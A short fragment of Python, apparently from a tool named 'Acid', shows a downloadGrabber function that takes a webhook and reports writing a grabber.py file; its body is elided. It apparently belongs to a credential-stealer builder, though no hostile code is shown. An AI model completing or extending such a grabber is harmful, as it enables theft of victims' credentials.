...
def downloadGrabber(webhook):
    set_console_title("Acid Download Grabber")
    ...
    print(f"{Fore.WHITE}\n[ {Fore.LIGHTGREEN_EX}C {Fore.WHITE}] Downloaded Successfully | File in {Fore.LIGHTGREEN_EX}/output/grabber.py{Fore.RESET}\n")
